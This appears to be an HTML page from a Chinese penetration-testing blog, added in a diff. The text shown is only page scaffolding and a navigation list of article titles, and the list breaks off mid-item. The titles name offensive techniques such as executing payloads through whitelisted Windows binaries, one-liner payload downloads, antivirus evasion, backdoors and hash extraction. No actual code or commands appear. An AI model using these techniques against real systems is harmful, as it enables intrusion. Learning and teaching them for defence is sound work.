@@ -1,0 +1,2486 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>8、模拟诉求任务攻击 | 纸条</title>
+  <meta name="keywords" content>
+  <meta name="description" content="8、模拟诉求任务攻击 | 纸条">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="纸条-失败的理想主义者！">
+<meta name="keywords" content="Python,Python黑客,Python渗透工具">
+<meta property="og:type" content="website">
+<meta property="og:title" content="纸条">
+<meta property="og:url" content="http://autoing.github.io/categories/index.html">
+<meta property="og:site_name" content="纸条">
+<meta property="og:description" content="纸条-失败的理想主义者！">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-05-22T04:15:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="纸条">
+<meta name="twitter:description" content="纸条-失败的理想主义者！">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/photoswipe/4.1.2/photoswipe.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/photoswipe/4.1.2/default-skin/default-skin.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="true">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar.jpg" />
+</a>
+<div class="author">
+    <span>纸条</span>
+</div>
+
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small> (206)</small></div></li>
+    
+        
+            
+            <li><div data-rel="Micro8">Micro8<small> (100)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="代码审计">代码审计<small> (7)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="数据库">数据库<small> (2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Git">Git<small> (1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Linux">Linux<small> (2)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="网络基础">网络基础<small> (5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="渗透测试">渗透测试<small> (15)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PHP编程">PHP编程<small> (9)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Python">Python<small> (46)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="回收站">回收站<small> (7)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="原创工具">原创工具<small> (5)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="Windows">Windows<small> (6)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="漏洞库">漏洞库<small> (1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  " target="_blank" href="https://github.com/autoing">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="206">
+<input type="hidden" id="yelog_site_word_count" value="346.4k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://yelog.org/">叶落阁</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode==13){return false;}">
+        <input class="search" type="text" placeholder="以 in: 开头进行全文搜索" autocomplete="off"id="local-search-input" >
+        <i class="cross"></i>
+    </form>
+    <div class="tags-list">
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        <a  class="原创工具 "
+           href="/article/tool-url-survival.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Python 资产发现小脚本">Python 资产发现小脚本</span>
+            <span class="post-date" title="2019-09-24 23:24:36">2019/09/24</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/100_HTTP隧道reDuh第四季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="100、HTTP隧道reDuh第四季">100、HTTP隧道reDuh第四季</span>
+            <span class="post-date" title="2019-09-21 19:07:15">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/99_HTTP隧道Tunna第三季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="99、HTTP隧道Tunna第三季">99、HTTP隧道Tunna第三季</span>
+            <span class="post-date" title="2019-09-21 19:07:14">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/98_HTTP隧道reGeorg第二季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="98、HTTP隧道reGeorg第二季">98、HTTP隧道reGeorg第二季</span>
+            <span class="post-date" title="2019-09-21 19:07:12">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/97_MSF配置自定义Payload控制目标主机权限.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="97、MSF配置自定义Payload控制目标主机权限">97、MSF配置自定义Payload控制目标主机权限</span>
+            <span class="post-date" title="2019-09-21 19:07:10">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/96_HTTP隧道ABPTTS第一季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="96、HTTP隧道ABPTTS第一季">96、HTTP隧道ABPTTS第一季</span>
+            <span class="post-date" title="2019-09-21 19:07:08">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/95_基于Portfwd端口转发.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="95、基于Portfwd端口转发">95、基于Portfwd端口转发</span>
+            <span class="post-date" title="2019-09-21 19:07:06">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/94_基于实战中的small-payload.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="94、基于实战中的small-payload">94、基于实战中的small-payload</span>
+            <span class="post-date" title="2019-09-21 19:07:04">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/93_与CrackMapExec结合攻击.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="93、与CrackMapExec结合攻击">93、与CrackMapExec结合攻击</span>
+            <span class="post-date" title="2019-09-21 19:07:02">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/92_实战中的Payload应用.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="92、实战中的Payload应用">92、实战中的Payload应用</span>
+            <span class="post-date" title="2019-09-21 19:07:00">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/91_从目标文件中做信息搜集第一季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="91、从目标文件中做信息搜集第一季">91、从目标文件中做信息搜集第一季</span>
+            <span class="post-date" title="2019-09-21 19:06:58">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/90_基于白名单zipfldr.dll执行payload第十八季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="90、基于白名单zipfldr.dll执行payload第十八季">90、基于白名单zipfldr.dll执行payload第十八季</span>
+            <span class="post-date" title="2019-09-21 19:06:56">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/89_基于白名单Url.dll执行payload第十七季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="89、基于白名单Url.dll执行payload第十七季">89、基于白名单Url.dll执行payload第十七季</span>
+            <span class="post-date" title="2019-09-21 19:06:52">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/88_基于白名单Ftp.exe执行payload第十九季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="88、基于白名单Ftp.exe执行payload第十九季">88、基于白名单Ftp.exe执行payload第十九季</span>
+            <span class="post-date" title="2019-09-21 19:06:50">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/87_基于白名单Cmstp.exe执行payload第十六季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="87、基于白名单Cmstp.exe执行payload第十六季">87、基于白名单Cmstp.exe执行payload第十六季</span>
+            <span class="post-date" title="2019-09-21 19:06:48">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/86_基于白名单Msiexec执行payload第八季补充.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="86、基于白名单Msiexec执行payload第八季补充">86、基于白名单Msiexec执行payload第八季补充</span>
+            <span class="post-date" title="2019-09-21 19:06:46">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/85_基于白名单Pcalua执行payload第十五季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="85、基于白名单Pcalua执行payload第十五季">85、基于白名单Pcalua执行payload第十五季</span>
+            <span class="post-date" title="2019-09-21 19:06:44">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/84_基于白名单Forfiles执行payload第十四季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="84、基于白名单Forfiles执行payload第十四季">84、基于白名单Forfiles执行payload第十四季</span>
+            <span class="post-date" title="2019-09-21 19:06:42">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/83_基于白名单PsExec执行payload第十三季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="83、基于白名单PsExec执行payload第十三季">83、基于白名单PsExec执行payload第十三季</span>
+            <span class="post-date" title="2019-09-21 19:06:40">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/82_基于白名单Odbcconf执行payload第十二季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="82、基于白名单Odbcconf执行payload第十二季">82、基于白名单Odbcconf执行payload第十二季</span>
+            <span class="post-date" title="2019-09-21 19:06:38">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/81_基于白名单Rundll32.exe执行payload第十一季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="81、基于白名单Rundll32.exe执行payload第十一季">81、基于白名单Rundll32.exe执行payload第十一季</span>
+            <span class="post-date" title="2019-09-21 19:06:36">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/80_基于白名单Wmic执行payload第十季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="80、基于白名单Wmic执行payload第十季">80、基于白名单Wmic执行payload第十季</span>
+            <span class="post-date" title="2019-09-21 19:06:34">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/79_基于白名单Regsvr32执行payload第九季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="79、基于白名单Regsvr32执行payload第九季">79、基于白名单Regsvr32执行payload第九季</span>
+            <span class="post-date" title="2019-09-21 19:06:30">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/78_基于白名单Msiexec执行payload第八季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="78、基于白名单Msiexec执行payload第八季">78、基于白名单Msiexec执行payload第八季</span>
+            <span class="post-date" title="2019-09-21 19:06:28">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/77_基于白名单Csc.exe执行payload第七季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="77、基于白名单Csc.exe执行payload第七季">77、基于白名单Csc.exe执行payload第七季</span>
+            <span class="post-date" title="2019-09-21 19:06:26">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/76_基于白名单Compiler.exe执行payload第六季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="76、基于白名单Compiler.exe执行payload第六季">76、基于白名单Compiler.exe执行payload第六季</span>
+            <span class="post-date" title="2019-09-21 19:06:24">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/75_基于白名单Mshta.exe执行payload第五季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="75、基于白名单Mshta.exe执行payload第五季">75、基于白名单Mshta.exe执行payload第五季</span>
+            <span class="post-date" title="2019-09-21 19:06:22">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/74_基于白名单regsvcs.exe执行payload第四季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="74、基于白名单regsvcs.exe执行payload第四季">74、基于白名单regsvcs.exe执行payload第四季</span>
+            <span class="post-date" title="2019-09-21 19:06:20">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/73_基于白名单Regasm.exe执行payload第三季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="73、基于白名单Regasm.exe执行payload第三季">73、基于白名单Regasm.exe执行payload第三季</span>
+            <span class="post-date" title="2019-09-21 19:06:18">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/72_基于白名单Installutil.exe执行payload第二季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="72、基于白名单Installutil.exe执行payload第二季">72、基于白名单Installutil.exe执行payload第二季</span>
+            <span class="post-date" title="2019-09-21 19:06:16">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/71_基于白名单Msbuild.exe执行payload第一季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="71、基于白名单Msbuild.exe执行payload第一季">71、基于白名单Msbuild.exe执行payload第一季</span>
+            <span class="post-date" title="2019-09-21 19:06:14">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/70_ftp一句话下载payload补充.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="70、ftp一句话下载payload补充">70、ftp一句话下载payload补充</span>
+            <span class="post-date" title="2019-09-21 19:06:12">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/69_渗透-持续渗透-后渗透的本质.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="69、渗透-持续渗透-后渗透的本质">69、渗透-持续渗透-后渗透的本质</span>
+            <span class="post-date" title="2019-09-21 19:06:08">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/68_基于Ruby内存加载shellcode第一季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="68、基于Ruby内存加载shellcode第一季">68、基于Ruby内存加载shellcode第一季</span>
+            <span class="post-date" title="2019-09-21 19:06:06">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/67_meterpreter下的irb操作第一季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="67、meterpreter下的irb操作第一季">67、meterpreter下的irb操作第一季</span>
+            <span class="post-date" title="2019-09-21 19:06:04">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/66_借助aspx对payload进行分离免杀.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="66、借助aspx对payload进行分离免杀">66、借助aspx对payload进行分离免杀</span>
+            <span class="post-date" title="2019-09-21 19:06:02">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/65_离线提取目标机hash补充.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="65、离线提取目标机hash补充">65、离线提取目标机hash补充</span>
+            <span class="post-date" title="2019-09-21 19:06:00">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/64_高级持续渗透-第八季demo便是远控.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="64、高级持续渗透-第八季demo便是远控">64、高级持续渗透-第八季demo便是远控</span>
+            <span class="post-date" title="2019-09-21 19:05:58">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/63_高级持续渗透-第七季demo的成长.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="63、高级持续渗透-第七季demo的成长">63、高级持续渗透-第七季demo的成长</span>
+            <span class="post-date" title="2019-09-21 19:05:56">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/62_高级持续渗透-第六季关于后门.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="62、高级持续渗透-第六季关于后门">62、高级持续渗透-第六季关于后门</span>
+            <span class="post-date" title="2019-09-21 19:05:54">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/61_高级持续渗透-第五季关于后门.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="61、高级持续渗透-第五季关于后门">61、高级持续渗透-第五季关于后门</span>
+            <span class="post-date" title="2019-09-21 19:05:52">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/60_高级持续渗透-第四季关于后门.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="60、高级持续渗透-第四季关于后门">60、高级持续渗透-第四季关于后门</span>
+            <span class="post-date" title="2019-09-21 19:05:50">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/59_高级持续渗透-第三季关于后门补充二.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="59、高级持续渗透-第三季关于后门补充二">59、高级持续渗透-第三季关于后门补充二</span>
+            <span class="post-date" title="2019-09-21 19:05:46">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/58_高级持续渗透-第二季关于后门补充一.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="58、高级持续渗透-第二季关于后门补充一">58、高级持续渗透-第二季关于后门补充一</span>
+            <span class="post-date" title="2019-09-21 19:05:44">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/57_高级持续渗透-第一季关于后门.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="57、高级持续渗透-第一季关于后门">57、高级持续渗透-第一季关于后门</span>
+            <span class="post-date" title="2019-09-21 19:05:42">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/56_离线提取目标机hash.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="56、离线提取目标机hash">56、离线提取目标机hash</span>
+            <span class="post-date" title="2019-09-21 19:05:40">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/55_与Smbmap结合攻击.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="55、与Smbmap结合攻击">55、与Smbmap结合攻击</span>
+            <span class="post-date" title="2019-09-21 19:05:38">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/54_基于Powershell做Socks4-5代理.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="54、基于Powershell做Socks4-5代理">54、基于Powershell做Socks4-5代理</span>
+            <span class="post-date" title="2019-09-21 19:05:36">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/53_内网渗透中的文件传输.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="53、内网渗透中的文件传输">53、内网渗透中的文件传输</span>
+            <span class="post-date" title="2019-09-21 19:05:34">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/52_渗透的本质是信息搜集.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="52、渗透的本质是信息搜集">52、渗透的本质是信息搜集</span>
+            <span class="post-date" title="2019-09-21 19:05:32">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/51_项目回忆：体系的本质是知识点串联.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="51、项目回忆：体系的本质是知识点串联">51、项目回忆：体系的本质是知识点串联</span>
+            <span class="post-date" title="2019-09-21 19:05:30">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/50_基于SqlDataSourceEnumerator发现内网存活主机.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="50、基于SqlDataSourceEnumerator发现内网存活主机">50、基于SqlDataSourceEnumerator发现内网存活主机</span>
+            <span class="post-date" title="2019-09-21 19:05:28">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/49_关于Powershell对抗安全软件.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="49、关于Powershell对抗安全软件">49、关于Powershell对抗安全软件</span>
+            <span class="post-date" title="2019-09-21 19:05:24">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/48_payload分离免杀思路第二季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="48、payload分离免杀思路第二季">48、payload分离免杀思路第二季</span>
+            <span class="post-date" title="2019-09-21 19:05:22">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/47_payload分离免杀思路.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="47、payload分离免杀思路">47、payload分离免杀思路</span>
+            <span class="post-date" title="2019-09-21 19:05:20">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/46_powershell一句话下载payload.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="46、powershell一句话下载payload">46、powershell一句话下载payload</span>
+            <span class="post-date" title="2019-09-21 19:05:18">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/45_解决bat一句话下载payload黑窗.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="45、解决bat一句话下载payload黑窗">45、解决bat一句话下载payload黑窗</span>
+            <span class="post-date" title="2019-09-21 19:05:16">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/44_ertutil一句话下载payload补充.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="44、ertutil一句话下载payload补充">44、ertutil一句话下载payload补充</span>
+            <span class="post-date" title="2019-09-21 19:05:14">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/43_js一句话下载payload.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="43、js一句话下载payload">43、js一句话下载payload</span>
+            <span class="post-date" title="2019-09-21 19:05:12">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/42_攻击FTP服务.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="42、攻击FTP服务">42、攻击FTP服务</span>
+            <span class="post-date" title="2019-09-21 19:05:10">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/41_bitsadmin一句话下载payload.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="41、bitsadmin一句话下载payload">41、bitsadmin一句话下载payload</span>
+            <span class="post-date" title="2019-09-21 19:05:08">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/40_ftp一句话下载payload.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="40、ftp一句话下载payload">40、ftp一句话下载payload</span>
+            <span class="post-date" title="2019-09-21 19:05:06">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/39_vbs一句话下载payload补充.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="39、vbs一句话下载payload补充">39、vbs一句话下载payload补充</span>
+            <span class="post-date" title="2019-09-21 19:05:02">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/38_certutil一句话下载payload.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="38、certutil一句话下载payload">38、certutil一句话下载payload</span>
+            <span class="post-date" title="2019-09-21 19:05:00">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/37_vbs一句话下载payload.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="37、vbs一句话下载payload">37、vbs一句话下载payload</span>
+            <span class="post-date" title="2019-09-21 19:04:58">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/36_解决vps上ssh掉线.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="36、解决vps上ssh掉线">36、解决vps上ssh掉线</span>
+            <span class="post-date" title="2019-09-21 19:04:56">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/35_与Sqlmap结合攻击.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="35、与Sqlmap结合攻击">35、与Sqlmap结合攻击</span>
+            <span class="post-date" title="2019-09-21 19:04:54">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/34_攻击SqlServer服务.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="34、攻击SqlServer服务">34、攻击SqlServer服务</span>
+            <span class="post-date" title="2019-09-21 19:04:52">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/33_攻击Mysql服务.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="33、攻击Mysql服务">33、攻击Mysql服务</span>
+            <span class="post-date" title="2019-09-21 19:04:50">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/32_配置vps上的msf.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="32、配置vps上的msf">32、配置vps上的msf</span>
+            <span class="post-date" title="2019-09-21 19:04:48">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/31_msf的前生今世.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="31、msf的前生今世">31、msf的前生今世</span>
+            <span class="post-date" title="2019-09-21 19:04:46">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/30_解决msfvenom命令自动补全.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="30、解决msfvenom命令自动补全">30、解决msfvenom命令自动补全</span>
+            <span class="post-date" title="2019-09-21 19:04:44">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/29_发现目标WEB程序敏感目录第一季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="29、发现目标WEB程序敏感目录第一季">29、发现目标WEB程序敏感目录第一季</span>
+            <span class="post-date" title="2019-09-21 19:04:40">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/28_基于MSF发现内网存活主机第六季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="28、基于MSF发现内网存活主机第六季">28、基于MSF发现内网存活主机第六季</span>
+            <span class="post-date" title="2019-09-21 19:04:38">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/27_基于MSF发现内网存活主机第五季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="27、基于MSF发现内网存活主机第五季">27、基于MSF发现内网存活主机第五季</span>
+            <span class="post-date" title="2019-09-21 19:04:36">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/26_基于MSF发现内网存活主机第四季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="26、基于MSF发现内网存活主机第四季">26、基于MSF发现内网存活主机第四季</span>
+            <span class="post-date" title="2019-09-21 19:04:34">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/25_基于MSF发现内网存活主机第三季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="25、基于MSF发现内网存活主机第三季">25、基于MSF发现内网存活主机第三季</span>
+            <span class="post-date" title="2019-09-21 19:04:31">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/24_基于MSF发现内网存活主机第二季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="24、基于MSF发现内网存活主机第二季">24、基于MSF发现内网存活主机第二季</span>
+            <span class="post-date" title="2019-09-21 19:04:29">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/23_基于MSF发现内网存活主机第一季.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="23、基于MSF发现内网存活主机第一季">23、基于MSF发现内网存活主机第一季</span>
+            <span class="post-date" title="2019-09-21 19:04:27">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/22_基于SMB发现内网存活主机.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="22、基于SMB发现内网存活主机">22、基于SMB发现内网存活主机</span>
+            <span class="post-date" title="2019-09-21 19:04:25">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/21_基于ICMP发现内网存活主机.html"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="21、基于ICMP发现内网存活主机">21、基于ICMP发现内网存活主机</span>
+            <span class="post-date" title="2019-09-21 19:04:23">2019/09/21</span>
+        </a>
+        
+        <a  class="Micro8 "
+           href="/article/20_基于snmp发现内网存活主机.html"
+           data-tag=""
+           data-author="" >
